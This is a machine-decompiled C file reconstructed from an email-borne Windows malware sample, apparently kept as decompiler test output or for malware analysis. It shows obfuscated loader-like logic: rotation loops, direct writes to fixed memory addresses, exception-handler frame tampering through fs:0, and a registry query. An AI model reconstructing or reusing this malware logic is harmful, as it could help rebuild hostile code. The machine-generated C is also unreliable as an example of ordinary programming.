// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1351/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401111(word32 edx, byte * ebx, Eq_181 * ebp, int32 esi, Eq_389 * fs, word32 dwArg00, int32 dwArg04, HBITMAP, HBITMAP, LPCSTR, LPSTR, PLONG, word32 dwArg90)
{
// def fp
// def Mem0
// def esi
// def ebx
// def ebp
// def fs
// def dwArg00
// def dwArg04
// def tArg08
// def tArg0C
// def tArg10
// def tArg14
// def tArg18
	esp_1 = fp;
	Mem0[0x00401079:word32]();
	edi_59 = ebx;
	esi_60 = esi >> 0x0000001D;
	eax_61 = ebx;
	al_62 = (byte) ebx;
	esi_63 = (esi >> 0x0000001D) + ebx;
	si_64 = (word16) esi_63;
	v10_65 = *ebx + al_62;
	*ebx = v10_65;
	v11_67 = *ebx + al_62;
	*ebx = v11_67;
	v12_69 = *ebx + al_62;
	*ebx = v12_69;
	v13_71 = *ebx + al_62;
	*ebx = v13_71;
	v14_73 = *ebx + al_62;
	*ebx = v14_73;
	v15_75 = *ebx + al_62;
	*ebx = v15_75;
	v16_77 = *ebx + al_62;
	*ebx = v16_77;
	v17_79 = *ebx + al_62;
	*ebx = v17_79;
	v18_81 = *ebx + al_62;
	*ebx = v18_81;
	v19_83 = *ebx + al_62;
	*ebx = v19_83;
	v20_85 = *ebx + al_62;
	*ebx = v20_85;
	v21_87 = *ebx + al_62;
	*ebx = v21_87;
	v22_89 = *ebx + al_62;
	*ebx = v22_89;
	v23_91 = *ebx + al_62;
	*ebx = v23_91;
	v24_93 = *ebx + al_62;
	*ebx = v24_93;
	v25_95 = *ebx + al_62;
	*ebx = v25_95;
	si_98 = __ror(si_64, 0x01);
	eax_100 = ebx;
	edi_103 = ebx - 0x00000001;
	edx_104 = fp;
	edi_108 = ebx - 0x00000001 + dwArg00;
	do
	{
// si_111 = PHI(si_98, si_120)
// edx_113 = PHI(edx_104, edx_114)
		edx_114 = edx_113 + 0x00000001;
		ecx_117 = edx_114->ptr0000;
		si_120 = __rol(si_111, 0x06);
	} while (ecx_117 != ebx);
	edx_125 = 0x00000000;
	dl_126 = 0x00;
	eax_127 = ebp;
	eax_129 = &ebp->b0007;
	__rol(edi_108, 0x17);
	dl_136 = ebp->b0007 ^ 0x00;
	edx_137 = (word32) dl_136;
	if (0x00000090 != edx_137)
	{
		ImageList_Replace(dwArg00, dwArg04, tArg08, tArg0C);
		edx_301 = edx_137;
		dx_302 = (word16) edx_137;
		tArg0C_304.u0 = 0x751CF59B;
		RegQueryValueA(tArg0C_304, tArg10, tArg14, tArg18);
		eax_312 = __indw(dx_302);
		al_313 = (byte) eax_312;
		__lock();
		v37_315 = *eax_312 + al_313;
		*eax_312 = v37_315;
		v38_317 = *eax_312 + al_313;
		*eax_312 = v38_317;
		eax_325 = 0x77C5009C;
		al_326 = (byte) eax_325;
		v41_331 = (byte *) 0x77C5009C + al_326;
		Mem332[0x77C5009C:byte] = v41_331;
		v42_333 = (word32 *) 0x132D5DEF | 0x77C5009C;
		(word32 *) 0x132D5DEF = v42_333;
		esp_337 = fp - 0xFFFFFF70;
	}
// esp_150 = PHI(esp_337, esp_1)
	edx_152 = esp_150;
	dx_153 = (word16) edx_152;
	__ror(0x00000090, 0x0A);
	ecx_157 = 0x00127857;
	cx_160 = dx_153;
	ecx_161 = DPB(ecx_157, cx_160, 0, 16);
	edi_163 = *ecx_161;
	eax_166 = 0x0040110B;
	ecx_170 = globals->dw40110B;
	do
	{
// eax_175 = PHI(eax_181, eax_166)
// edi_176 = PHI(edi_177, edi_163)
		edi_177 = edi_176 + 0x00000001;
		eax_179 = eax_175 + (fp + 0x00000018);
		edx_180 = edi_177->dw0000;
		eax_181 = eax_179 + esp_150->ptr0000;
		edx_184 = edx_180 - ecx_170;
	} while ((edx_184 & edx_184) != 0x00000000);
	esi_192 = edi_177;
	eax_194 = eax_181 + edx_184;
	esi_195 = esi_192 - 0x00000003;
	dx_198 = *esi_195;
	edx_199 = DPB(edx_184, dx_198, 0, 16);
	v46_201 = edx_199;
	ebx_203 = v46_201;
	eax_204 = eax_194 + 0x0041F9F0;
	eax_205 = eax_204 - 0x79468A55;
	esp_206 = esp_150 - 0x00000004;
	esp_206->ptr0000 = esp_206;
	edi_208 = esp_206->ptr0000;
	esp_210 = &esp_206->t0001;
	__rol(eax_205, 0x03);
	edx_213 = edi_208->ptr0000;
	ecx_215 = edx_213;
	edx_220 = globals->dw40104E;
	do
	{
// ecx_228 = PHI(ecx_215, ecx_233)
		eax_230 = ecx_228->ptr0000;
		ecx_233 = ecx_228 + 0x00000001;
		edi_235 = eax_230;
		edi_238 = edi_235 ^ edx_220;
	} while ((edi_238 & edi_238) != 0x00000000);
	v49_247 = ecx_233;
	ebp_249 = v49_247;
	ecx_253 = fp + 0x00000018 >> 0x00000003;
	cx_254 = (word16) ecx_253;
	edx_256 = ebx_203;
	edx_258 = edx_256 << 0x00000010;
	__ror(cx_254, 0x05);
	edx_262 = edx_258 >>u 0x00000010;
	dx_263 = (word16) edx_262;
	eax_265 = 0x003F1338 + edx_262;
	esp_267 = esp_210 - 0x00000004;
	*esp_267 = eax_265;
	__ror(dx_263, 0x09);
	esp_274 = esp_267 - 0x00000004;
	Mem275[esp_274 + 0x00000000:word32] = Mem268[fs:0x00000000:word32];
	eax_276 = eax_265 >> 0x0000001A;
	esi_277 = esp_274;
	eax_278 = ~eax_276;
	ax_279 = (word16) eax_278;
	Mem280[fs:0x00000000:word32] = esi_277;
	esp_282 = esp_274 - 0x00000004;
	*esp_282 = 0x00000000;
	v55_286 = ebp_249;
	edx_288 = v55_286;
	__ror(ax_279, 0x04);
	esp_291 = esp_282 - 0x00000004;
	*esp_291 = edx_288;
	__ror(0x00000000, 0x0D);
	return;
}

